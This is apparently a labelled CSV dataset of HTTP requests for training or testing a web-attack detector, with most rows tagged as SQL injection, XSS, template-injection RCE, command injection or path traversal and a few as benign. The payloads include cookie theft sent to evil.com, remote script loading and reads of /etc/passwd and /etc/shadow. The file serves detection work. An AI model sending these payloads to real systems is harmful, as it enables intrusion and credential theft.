request_normalized,label
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

input=1 AND 1=1&submit=1",sqli
"POST /eval?code=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 81

input={{config.__class__.__init__.__globals__['os'].popen('id').read()}}&submit=1",rce
"GET /products?filter=' OR 'x'='x HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /view?doc=../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /search?q=' AND 1=2 UNION SELECT table_name FROM information_schema.tables-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /feedback?msg=<script>document.write('<img src=http://evil.com/' document.cookie '>')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /api/categories HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /view?doc=....//....//etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /images/img_6500.jpg HTTP/1.1
Host: cdn.example.com
Referer: https://example.com/",benign
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

input=../../../../../../../../../../etc/passwd&submit=1",path_traversal
"GET /profile?bio=javascript:alert('XSS') HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /view?doc=../../../proc/self/environ HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

input=*{7*7}&submit=1",rce
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

input=....//....//etc/passwd&submit=1",path_traversal
"GET /api/categories HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /exec?cmd=| type C:\Windows\win.ini HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /tools/lookup?domain=; systeminfo HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

input=';alert(String.fromCharCode(88,83,83))//&submit=1",xss
"GET /download?file=../../../../../../../../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /api/items?name=1; SELECT * FROM users WHERE '1'='1 HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /api/items?name=1' OR 1=1-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /exec?cmd=$(id) HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /search?q=<script>alert('XSS')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /favicon.ico HTTP/1.1
Host: example.com",benign
"POST /api/items?name=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

input=1 UNION SELECT null,password FROM users--&submit=1",sqli
"GET /comment?text=<script>document.write('<img src=http://evil.com/' document.cookie '>')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /view?doc=../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /comment?text=<SCRIPT SRC=http://evil.com/xss.js></SCRIPT> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /download?file=../../../../etc/shadow HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /exec?cmd=& ipconfig HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /search?q=<script>alert('XSS')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /api/categories HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /images/img_7285.jpg HTTP/1.1
Host: cdn.example.com
Referer: https://example.com/",benign
"GET /calc?formula={{lipsum.__globals__['os'].popen('id').read()}} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /favicon.ico HTTP/1.1
Host: example.com",benign
"GET /api/v2/orders?status=pending&user_id=3111 HTTP/1.1
Host: api.example.com
Authorization: Bearer 8f0484e325f6498ffb8cc9f1362661e4",benign
"GET /template?expr=java.lang.Runtime.exec('id') HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /feedback?msg=<SCRIPT SRC=http://evil.com/xss.js></SCRIPT> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /favicon.ico HTTP/1.1
Host: example.com",benign
"GET /comment?text=<IMG SRC=JaVaScRiPt:alert('XSS')> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /products?filter=1 UNION SELECT null,password FROM users-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

input=<% Runtime.getRuntime().exec('id') %>&submit=1",rce
"GET /favicon.ico HTTP/1.1
Host: example.com",benign
